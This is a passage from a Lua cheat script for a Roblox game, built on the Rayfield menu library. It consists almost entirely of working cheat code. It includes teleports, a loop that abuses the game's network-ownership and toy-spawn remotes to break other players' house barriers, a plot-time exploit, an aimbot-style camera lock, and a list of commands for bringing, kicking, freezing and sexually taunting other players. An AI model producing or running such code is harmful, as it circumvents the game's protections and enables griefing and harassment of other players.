                Title = "Teleportation",
                Content = player.Name .. " was sent to RuhubsDogAhhPrison",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To ExtremelyGoodPrison",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["ExtremelyGoodPrison"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to ExtremelyGoodPrison",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To TrainCave",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["TrainCave"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to TrainCave",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To IslandCave",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["IslandCave"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to IslandCave",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To ChineseRoof",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["ChineseRoof"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to ChineseRoof",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To UfoCave",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["UfoCave"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to UfoCave",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To Prison",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["Prison"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to Prison",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To BlueHouseSlot",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["BlueHouseSlot"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to BlueHouseSlot",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To SpawnSlot",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["SpawnSlot"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to SpawnSlot",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To HauntedSlot",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["HauntedSlot"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to HauntedSlot",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To RandomSlot",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["RandomSlot"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to RandomSlot",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To BeachSlot",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["BeachSlot"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to BeachSlot",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})


LocalPlayer = Players.LocalPlayer
 autoBlobmanEnabled = false
targetCFrame = CFrame.new(466.741, 28, -745.949, 0.906275, -0.000000, -0.422688, 0.000000, 1.000000, -0.000000, 0.422688, 0.000000, 0.906275)
 originalPosition = nil
 blobmanSequenceActive = false
 processingBlobmans = {}

 function saveCurrentPosition()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        originalPosition = LocalPlayer.Character.HumanoidRootPart.CFrame
        return true
    end
    return false
end

 function teleportToPosition(cframe)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = cframe
        LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        LocalPlayer.Character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
        return true
    end
    return false
end

 function debugPrint(...)
    print("[BLOBMAN DEBUG]", ...)
end

 function sitOnClosestBlobman()
    local closest, dist = nil, math.huge
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name == "CreatureBlobman" and obj:IsA("Model") then
            local seat = obj:FindFirstChild("VehicleSeat")
            if seat then
                local d = (root.Position - seat.Position).Magnitude
                if d < dist then 
                    dist = d
                    closest = obj 
                end
            end
        end
    end
    
    if closest then
        local seat = closest:FindFirstChild("VehicleSeat")
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if seat and hum and not seat.Occupant then
            debugPrint(" d' :", closest.Name)
            seat:Sit(hum)
            task.wait(0.3)
            return seat.Occupant == hum
        end
    end
    return false
end

 function sitOnBlobman(blobman)
    local seat = blobman:FindFirstChild("VehicleSeat")
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
    
    if seat and humanoid and not seat.Occupant then
        debugPrint("i like turtles- oats")
        seat:Sit(humanoid)
        task.wait(0.3)
        return seat.Occupant == humanoid
    end
    return false
end

 function getOffBlobman()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        local humanoid = LocalPlayer.Character.Humanoid
        if humanoid.SeatPart then
            humanoid.Sit = false
            humanoid.Jump = true
            return true
        end
    end
    return false
end

 function executeBlobmanSequence(blobman)
    if processingBlobmans[blobman] then return end
    processingBlobmans[blobman] = true
    
    task.spawn(function()
        if not saveCurrentPosition() then
            processingBlobmans[blobman] = nil
            return
        end
        
        debugPrint("debug thing okkkk   ")
        
        local blobmanPosition = nil
        if blobman:FindFirstChild("VehicleSeat") then
            blobmanPosition = blobman.VehicleSeat.CFrame
        elseif blobman:FindFirstChild("HumanoidRootPart") then
            blobmanPosition = blobman.HumanoidRootPart.CFrame
        elseif blobman.PrimaryPart then
            blobmanPosition = blobman:GetPrimaryPartCFrame()
        end
        
        if blobmanPosition then
            teleportToPosition(blobmanPosition + Vector3.new(0, 2, 0))
            task.wait(0)
        end
        
        if sitOnBlobman(blobman) then
            debugPrint("im marrying the blobman")
            task.wait(0)
        end
        
        teleportToPosition(targetCFrame)
        debugPrint("4art does not approve")
        task.wait(0)
        
        getOffBlobman()
        debugPrint("nononono")
        task.wait(0)
        
        if originalPosition then
            teleportToPosition(originalPosition)
            debugPrint("Lets teleport boii")
        end
        
        processingBlobmans[blobman] = nil
        debugPrint("Processing future wife(blobman)")
    end)
end

Workspace.DescendantAdded:Connect(function(descendant)
    if not autoBlobmanEnabled then return end
    
    if descendant.Name == "CreatureBlobman" and descendant:IsA("Model") then
        task.wait(0.1)
        executeBlobmanSequence(descendant)
    end
end)


BlobTab:CreateToggle({
    Name = "Delete blob ",
    CurrentValue = false,
    Flag = "AutoBlobman",
    Callback = function(Value)
        autoBlobmanEnabled = Value
        if Value then
            Rayfield:Notify({
                Title = "Auto Blobman",
                Content = "only gets blobs spawned after toggle",
                Duration = 3
            })
        else
            Rayfield:Notify({
                Title = "Auto Blobman",
                Content = "off",
                Duration = 2
            })
            processingBlobmans = {}
        end
    end
})



Paragraph = InfoTab:CreateParagraph({Title = "All cmds", Content = "!bring <player> , !loopbring <player>, !unloopbring <player> , !bringall, !loopbringall, !unloopbringall , !pencil <player> , !looppencil <player> , !unlooppencil <player> , !blobkick <player>, !loopblobkick <player> , !unloopblobkick <player> , !tptowater <player> , !switch <player> , !bang <player> , !loopbang <player> , !unloopbang <player> , !heart <player>  , !loopheart <player> , !unloopheart <player> , !tptopoison <player> , !looptptopoison <player> , !unlooptptopoison , !blobfreeze  <player> ,!loopblobfreeze <player> , !unloopblobfreeze <player>"})
Paragraph = InfoTab:CreateParagraph({Title = "Credits", Content = "Oats, Made everything! Pato, Gave me toy unwelder and fixed loop dropdowns🥰"})

InfoTab:CreateDivider()

Players = game:GetService("Players")
LocalPlayer = Players.LocalPlayer
 ReplicatedStorage = game:GetService("ReplicatedStorage")
 Workspace = game:GetService("Workspace")

StatusLabel = InfoTab:CreateLabel("Broken: False")

destroyBarrierActive = false
destroyBarrierThread = nil
plotsBroken = false

InfoTab:CreateToggle({
    Name = "Destroy Barrier (snowball)",
    CurrentValue = false,
    Flag = "DestroyBarrierHouse",
    Callback = function(Value)
        if Value and plotsBroken then
            Rayfield:Notify({
                Title = "Already Broken",
                Content = "Plots are already broken!",
                Duration = 5,
                Image = 4483345998,
                Actions = {
                    Ignore = {
                        Name = "Okay!",
                        Callback = function()
                            print("The user tapped Okay!")
                        end
                    },
                },
            })
            return
        end

        destroyBarrierActive = Value

        if destroyBarrierThread then
            task.cancel(destroyBarrierThread)
            destroyBarrierThread = nil
        end

        if Value then
            local spawnedToysFolder = workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
            if spawnedToysFolder then
                for _, item in ipairs(spawnedToysFolder:GetChildren()) do
                    if item.Name == "BallSnowball" then
                        ReplicatedStorage.MenuToys.DestroyToy:FireServer(item)
                    end
                end
            end

            if not plotsBroken then
                StatusLabel:Set("Broken: False")
            end

            destroyBarrierThread = task.spawn(function()
                local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
                local SetNetworkOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                local DestroyGrabLine = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")

                local targetCFrame = CFrame.new(264.5792541503906, -5.477070331573486, 433.4557800292969)

                local function getSnowballs()
                    local snowballs = {}
                    local spawnedToysFolder = workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
                    if spawnedToysFolder then
                        for _, toy in ipairs(spawnedToysFolder:GetChildren()) do
                            if toy.Name == "BallSnowball" then
                                table.insert(snowballs, toy)
                            end
                        end
                    end
                    return snowballs
                end

                local function spawnSnowball()
                    if not destroyBarrierActive then return end
                    local playerPosition = LocalPlayer.Character and LocalPlayer.Character.PrimaryPart.Position or Vector3.new(0, 0, 0)
                    local initialCFrame = CFrame.new(playerPosition) * CFrame.Angles(-0.807, -0.884, -0.679)
                    task.spawn(function()
                        MenuToys.SpawnToyRemoteFunction:InvokeServer("BallSnowball", initialCFrame, Vector3.new(0, -120.21099853515625, 0))
                    end)
                end

                local function processSnowball(snowball)
                    if not destroyBarrierActive then return end
                    local soundPart = snowball:FindFirstChild("SoundPart")
                    if soundPart then
                        task.spawn(function()
                            SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
                        end)
                    end
                end

                local function teleportSnowballs(snowballs)
                    if not destroyBarrierActive then return end
                    for _, snowball in ipairs(snowballs) do
                        task.spawn(function()
                            for _, part in ipairs(snowball:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CFrame = targetCFrame
                                end
                            end
                        end)
                    end
                end

                local function testWithOven()
                    if not destroyBarrierActive then return false end

                    local targetPosition = CFrame.new(242.66055297851562, -9.196549415588379, 444.3758850097656)
                    MenuToys.SpawnToyRemoteFunction:InvokeServer("OvenDarkGray", targetPosition, Vector3.new(0, -74.0790023803711, 0))

                    task.wait(0.5)
                    local spawnedToysFolder = workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
                    local oven

                    if spawnedToysFolder then
                        for _, child in ipairs(spawnedToysFolder:GetChildren()) do
                            if child.Name == "OvenDarkGray" and child:GetAttribute("AtSpawned") == nil then
                                oven = child
                                break
                            end
                        end
                    end

                    local stillExists = oven ~= nil

                    if stillExists then
                        StatusLabel:Set("Broken: True")
                        plotsBroken = true
                        Rayfield:Notify({
                            Title = "Success!",
                            Content = "The plots have been broken successfully!",
                            Duration = 5,
                            Image = 4483345998,
                            Actions = {
                                Ignore = {
                                    Name = "Awesome!",
                                    Callback = function()
                                        print("The user tapped Awesome!")
                                    end
                                },
                            },
                        })
                    end

                    return stillExists
                end

                while destroyBarrierActive do
                    local snowballs = getSnowballs()

                    if #snowballs < 2 then
                        if #snowballs < 1 then
                            spawnSnowball()
                            task.wait(0.02)
                        end
                        spawnSnowball()
                        task.wait(0.02)
                        snowballs = getSnowballs()
                    end

                    if #snowballs == 2 then
                        for _, snowball in ipairs(snowballs) do
                            processSnowball(snowball)
                        end

                        teleportSnowballs(snowballs)

                        local ovenResult = testWithOven()
                        if ovenResult then
                            break
                        else
                            task.wait(0.05)
                        end
                    end

                    task.wait(0.05)
                end
            end)
        else
            local spawnedToysFolder = workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
            if spawnedToysFolder then
                for _, item in ipairs(spawnedToysFolder:GetChildren()) do
                    if item.Name == "BallSnowball" or item.Name == "OvenDarkGray" then
                        ReplicatedStorage.MenuToys.DestroyToy:FireServer(item)
                    end
                end
            end
            if not plotsBroken then
                StatusLabel:Set("Broken: False")
            end
        end
    end,
})


Players = game:GetService("Players")
Player = Players.LocalPlayer
RunService = game:GetService("RunService")

Running = false
Teleported = false
SavedPos = nil
CurrentPlot = nil
Respawning = false
TPTime = 80

function gPlot()
	for _, v in ipairs(workspace.Plots:GetChildren()) do
		if v:FindFirstChild("PlotSign") and v.PlotSign:FindFirstChild("ThisPlotsOwners") then
			owners = v.PlotSign.ThisPlotsOwners
			if owners:FindFirstChild("Value") and owners.Value:FindFirstChild("TimeRemainingNum") then
				s, val = pcall(function() return owners.Value.TimeRemainingNum.Value end)
				if s and typeof(val) == "number" and val > 0 then
					return v, val
				end
			end
		end
	end
	return nil, 0
end

function gHRP()
	return Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
end

function sPos()
	hrp = gHRP()
	if hrp then
		SavedPos = hrp.Position
	end
end

function tpIn(p)
	hrp = gHRP()
	if hrp and p and p:FindFirstChild("House") then
		pos = p.House:GetPivot().Position + Vector3.new(math.random(-5,5), 3, math.random(-5,5))
		pcall(function() hrp.CFrame = CFrame.new(pos) end)
	end
end

function tpBack()
	hrp = gHRP()
	if hrp and SavedPos then
		pcall(function() hrp.CFrame = CFrame.new(SavedPos) end)
	end
end

function wRespawn(p)
	Respawning = true
	repeat task.wait(0.5) until Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
	task.wait(4)
	Respawning = false
	if Running and p then
		pcall(function()
			sPos()
			CurrentPlot = p
			tpIn(p)
			Teleported = true
		end)
	end
end

function chk()
	if not Running then return end
	p, t = gPlot()
	TimeLabel:Set("Current Time: " .. tostring(t))
	hrp = gHRP()
	if not hrp then
		task.spawn(function() wRespawn(p) end)
		return
	end
	if t <= TPTime and not Teleported then
		sPos()
		CurrentPlot = p
		tpIn(p)
		Teleported = true
	end
	if (t == 90 or t == 91) and Teleported and CurrentPlot == p then
		tpBack()
		Teleported = false
		CurrentPlot = nil
		SavedPos = nil
	end
end

TimeLabel = InfoTab:CreateLabel("Current Time: ...",10111107788, Color3.fromRGB(5, 0, 10), false)
InfoTab:CreateSlider({
   Name = "Teleport Time",
   Range = {10, 90},
   Increment = 1,
   Suffix = "seconds",
   CurrentValue = 80,
   Flag = "TeleportTimeSlider",
   Callback = function(v)
      TPTime = v
   end
})
InfoTab:CreateToggle({
   Name = "Infinite Time (Teleportation to the house)",
   Default = false,
   Callback = function(v)
      Running = v
      Teleported = false
      CurrentPlot = nil
      SavedPos = nil
      if v then
         chk()
      end
   end
})

local function ShaderAdd()
    local l = game:GetService("Lighting")
    local t = workspace:WaitForChild("Terrain")

    settings().Rendering.QualityLevel = Enum.QualityLevel.Level21

    l.Technology = Enum.Technology.ShadowMap
    l.ShadowSoftness = 0.15
    l.ClockTime = 9
    l.GeographicLatitude = 41.73

    l.Brightness = 5
    l.Ambient = Color3.fromRGB(70, 70, 70)
    l.ColorShift_Top = Color3.fromRGB(255, 138, 35)
    l.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
    l.OutdoorAmbient = Color3.fromRGB(135, 135, 135)

    l.GlobalShadows = true
    l.EnvironmentDiffuseScale = 1
    l.EnvironmentSpecularScale = 1
    l.ExposureCompensation = 0

    t.WaterReflectance = 0.08
    t.WaterTransparency = 0.85
    t.WaterWaveSize = 0.15
    t.WaterWaveSpeed = 12
    t.WaterColor = Color3.fromRGB(12, 84, 92)

    -- Remove existing Sky (optional, prevents stacking)
    local existingSky = l:FindFirstChildOfClass("Sky")
    if existingSky then
        existingSky:Destroy()
    end

    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://271042516"
    sky.SkyboxDn = "rbxassetid://271077243"
    sky.SkyboxFt = "rbxassetid://271042556"
    sky.SkyboxLf = "rbxassetid://271042310"
    sky.SkyboxRt = "rbxassetid://271042467"
    sky.SkyboxUp = "rbxassetid://271077958"
    sky.Parent = l
end




Players = game:GetService("Players")
 LocalPlayer = Players.LocalPlayer

 humanoid = LocalPlayer.Character:WaitForChild("Humanoid")
animator = humanoid:WaitForChild("Animator")

 isJerking = false
 animtrack = nil
 animation = nil
 animationSpeed = 0.1
 jerkPower = 1

function startJerk()
    if isJerking then return end
    
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hum = char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid")
    local anim = hum:FindFirstChildOfClass("Animator") or hum:WaitForChild("Animator")
    
    isJerking = true
    
    task.spawn(function()
        while isJerking do
            if not animation then
                animation = Instance.new("Animation")
                local isR15 = hum.RigType == Enum.HumanoidRigType.R15
                animation.AnimationId = isR15 and "rbxassetid://698251653" or "rbxassetid://72042024"
            end
            
            if not animtrack then
                animtrack = anim:LoadAnimation(animation)
            end
            
            animtrack:Play()
            animtrack:AdjustSpeed(animationSpeed * jerkPower)
            animtrack.TimePosition = 0.7
            
            task.wait(0.3)
            
            while isJerking and animtrack and animtrack.TimePosition < 0.7 do
                task.wait(0.1)
            end
            
            if animtrack then
                animtrack:Stop()
                animtrack:Destroy()
                animtrack = nil
            end
        end
    end)
end

function stopJerk()
    isJerking = false
    
    if animtrack then
        animtrack:Stop()
        animtrack:Destroy()
        animtrack = nil
    end
    
    if animation then
        animation:Destroy()
        animation = nil
    end
end

local jerkToggle = nil


InfoTab:CreateDivider()

Players = game:GetService("Players")
 Player = Players.LocalPlayer


Players.PlayerRemoving:Connect(function(player)
    Rayfield:Notify({
        Title = "Sm1 left",
        Content = (player and player.Name or "Unknown") .. " left the server",
        Duration = 5,
        Image = 4483362458
    })
end)

Players.PlayerAdded:Connect(function(plr)
    if plr:IsFriendsWith(Player.UserId) then
        Rayfield:Notify({
            Title = "Friend Joined",
            Content = plr.Name .. " has joined the game",
            Duration = 5,
            Image = 4483362458
        })
    end
end)

plr = game:GetService("Players")
 TeleportService = game:GetService("TeleportService")
 HttpService = game:GetService("HttpService")
 GuiService = game:GetService("GuiService")
PlaceId = game.PlaceId
JobId = game.JobId
 LocalPlayer = Players.LocalPlayer

autoRejoinEnabled = false

InfoTab:CreateButton({
	Name = "Rejoin",
	Callback = function()
		Rayfield:Notify({
			Title = "Attempting to rejoin...",
			Content = "Rejoin",
			Duration = 6.5,
			Image = 4483362458,
		})
		task.wait(0.5)
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
	end,
})

InfoTab:CreateButton({
    Name = "Server Hop",
    Callback = function()
        local servers = {}
        local success, response = pcall(function()
                local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
            return game:HttpGet(url)
        end)

        if not success or not response then
            Rayfield:Notify({ Title = "Server Hop", Content = "Failed to fetch servers.", Duration = 3 })
            return
        end

        local body = HttpService:JSONDecode(response)
        if body and body.data then
            for _, v in pairs(body.data) do
                if type(v) == "table" and v.playing and v.maxPlayers and v.id ~= JobId and v.playing < v.maxPlayers then
                    table.insert(servers, v.id)
                end
            end
        end

        if #servers > 0 then
            local randomServer = servers[math.random(1, #servers)]
            TeleportService:TeleportToPlaceInstance(PlaceId, randomServer, LocalPlayer)
        else
            Rayfield:Notify({ Title = "Server Hop", Content = "No available servers found.", Duration = 3 })
        end
    end
})

InfoTab:CreateToggle({
    Name = "Auto Rejoin",
    CurrentValue = false,
    Flag = "AutoRejoinToggle",
    Callback = function(state)
        autoRejoinEnabled = state
        if state then
            GuiService.ErrorMessageChanged:Connect(function()
                if autoRejoinEnabled then
                    task.spawn(function()
                        if #Players:GetPlayers() <= 1 then
                            LocalPlayer:Kick("\nAuto Rejoining...")
                            task.wait(0.5)
                            TeleportService:Teleport(PlaceId, LocalPlayer)
                        else
                            TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
                        end
                    end)
                end
            end)
            Rayfield:Notify({ Title = "Auto Rejoin", Content = "Enabled", Duration = 3 })
        else
            Rayfield:Notify({ Title = "Auto Rejoin", Content = "Disabled", Duration = 3 })
        end
    end
})

InfoTab:CreateDivider()

aimbotConnections = {}

InfoTab:CreateToggle({
    Name = "Q to look at closest",
    Default = false,
    Callback = function(Value)
        if Value then
            local Players = game:GetService("Players")
            local UserInputService = game:GetService("UserInputService")
            local RunService = game:GetService("RunService")
            local localPlayer = Players.LocalPlayer
            local camera = workspace.CurrentCamera
            local holdingQ = false

            local function getNearestPlayer()
                local closest, closestDist = nil, math.huge
                local myPos = camera.CFrame.Position
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local distance = (myPos - player.Character.HumanoidRootPart.Position).Magnitude
                        if distance < closestDist then
                            closest, closestDist = player, distance
                        end
                    end
                end
                return closest
            end

            table.insert(aimbotConnections, UserInputService.InputBegan:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.Q then holdingQ = true end
            end))
            table.insert(aimbotConnections, UserInputService.InputEnded:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.Q then holdingQ = false end
            end))
            table.insert(aimbotConnections, RunService.RenderStepped:Connect(function()
                if holdingQ then
                    local target = getNearestPlayer()
                    if target and target.Character then
                        camera.CFrame = CFrame.new(camera.CFrame.Position, target.Character.HumanoidRootPart.Position)
                    end
                end
            end))
        else
            for _, conn in pairs(aimbotConnections) do conn:Disconnect() end
            aimbotConnections = {}
        end
    end
})

Players = game:GetService("Players")
Player = Players.LocalPlayer
Workspace = workspace

skib2 = Instance.new("Folder")
skib2.Parent = Workspace
skib2.Name = "SkibidiHoles"

 gettingkicked = {}
 VOBBC = false

function getClosestPlayer(pos)
    local closest = nil
    local dist = math.huge
    for _, plr in pairs(Players:GetPlayers()) do
        local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local d = (hrp.Position - pos).Magnitude
            if d < dist then
                dist = d
                closest = plr
            end
        end
    end
    return closest
end

workspace.ChildAdded:Connect(function(model)
    if model.Name == "BlackHoleKick" then
        local hole = model:WaitForChild("Hole", 5)
        if not hole then return end
        
        local kickedmafa
        local victimPlayer = nil
        
        task.spawn(function()
            task.wait(0.1)
            
            kickedmafa = model:Clone()
            kickedmafa.Parent = skib2
            kickedmafa.Name = "Unknown's BlackHole"
            
            if not VOBBC then
                if kickedmafa:FindFirstChild("Hole") then
                    kickedmafa.Hole.Transparency = 1
                    if kickedmafa.Hole:FindFirstChild("BillboardGui") then
                        kickedmafa.Hole.BillboardGui.Enabled = false
                    end
                end
            end
            
            local starttime = tick()
            while kickedmafa and kickedmafa.Parent do
                if kickedmafa:FindFirstChild("Hole") and kickedmafa.Hole:FindFirstChild("BillboardGui") then
                    local billboardGui = kickedmafa.Hole.BillboardGui
                    if billboardGui:FindFirstChild("Large") then
                        billboardGui.Large.Rotation = (tick() - starttime) * 150
                    end
                    if billboardGui:FindFirstChild("Small") then
                        billboardGui.Small.Rotation = (tick() - starttime) * 150
                    end
                end
                task.wait()
            end
        end)
        
        local solved = false
        while not solved and model and model.Parent do
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = plr.Character.HumanoidRootPart
                    
                    if hrp.Anchored == true then
                        solved = true
                        
                        local alreadyFlagged = false
                        for _, id in pairs(gettingkicked) do
                            if id == plr.UserId then
                                alreadyFlagged = true
                                break
                            end
                        end
                        
                        if not alreadyFlagged then
                            victimPlayer = plr
                            table.insert(gettingkicked, plr.UserId)
                            
                            if kickedmafa then
                                kickedmafa.Name = plr.Name .. "'s BlackHole"
                            end
                            
                            local hpp = hrp.CFrame.Position
                            local bhk = hole.CFrame.Position
                            local distance = (hpp - bhk).Magnitude
                            local byPlayer = distance > 2
                            
                            local notifContent = string.format(
                                "%s (@%s) has been kicked%s at position (%d, %d, %d)",
                                plr.DisplayName,
                                plr.Name,
                                byPlayer and " by a player" or "",
                                math.floor(hole.CFrame.Position.X),
                                math.floor(hole.CFrame.Position.Y),
                                math.floor(hole.CFrame.Position.Z)
                            )
                            
                            Rayfield:Notify({
                                Title = "BlackHole Kick",
                                Content = notifContent,
                                Duration = 6.5,
                                Image = 4483362458
                            })
                            
                            task.spawn(function()
                                task.wait(5)
                                for i, id in pairs(gettingkicked) do
                                    if id == plr.UserId then
                                        table.remove(gettingkicked, i)
                                        break
                                    end
                                end
                            end)
                        end
                        break
                    end
                end
            end
            task.wait()
        end
    end
end)


 ViewBlackHolesToggle = InfoTab:CreateToggle({
    Name = "View Offline BlackHoles",
    CurrentValue = false,
    Flag = "ViewBlackHoles",
    Callback = function(Value)
        VOBBC = Value
        
        if VOBBC then
            for _, kickedmafa in pairs(skib2:GetChildren()) do
                if kickedmafa:FindFirstChild("Hole") then
                    if kickedmafa.Hole:FindFirstChild("BillboardGui") then
                        kickedmafa.Hole.BillboardGui.Enabled = true
                    end
                    
                    for _, prt in pairs(kickedmafa:GetDescendants()) do
                        if prt:IsA("BasePart") then
                            prt.Transparency = 0
                            if prt.Name == "HumanoidRootPart" then
                                prt.Transparency = 1
                            elseif prt.Name == "Hole" then
                                prt.Transparency = 0.25
                            end
                        end
                    end
                end
            end
            
            Rayfield:Notify({
                Title = "BlackHole Viewer",
                Content = "Offline BlackHoles are now visible",
                Duration = 3,
                Image = 4483362458
            })
        else
            for _, kickedmafa in pairs(skib2:GetChildren()) do
                if kickedmafa:FindFirstChild("Hole") then
                    if kickedmafa.Hole:FindFirstChild("BillboardGui") then
                        kickedmafa.Hole.BillboardGui.Enabled = false
                    end
                    
                    for _, prt in pairs(kickedmafa:GetDescendants()) do
                        if prt:IsA("BasePart") then
                            prt.Transparency = 1
                        end
                    end
                end
